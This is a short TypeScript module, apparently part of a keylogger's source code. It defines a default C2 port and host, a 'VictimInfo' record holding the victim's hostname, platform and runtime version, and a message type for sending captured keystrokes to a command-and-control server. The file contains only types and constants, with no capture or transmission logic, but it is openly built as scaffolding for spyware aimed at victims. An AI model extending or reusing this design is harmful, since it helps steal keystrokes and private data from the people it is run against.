import type { KeyEvent } from "./types.js";

export const DEFAULT_PORT = 4444;
export const DEFAULT_HOST = "127.0.0.1";

export interface VictimInfo {
  sessionId: string;
  platform: string;
  nodeVersion: string;
  hostname: string;
}

export type C2Message =
  | { type: "handshake"; victim: VictimInfo }
  | { type: "key"; event: KeyEvent }
  | { type: "disconnect" };
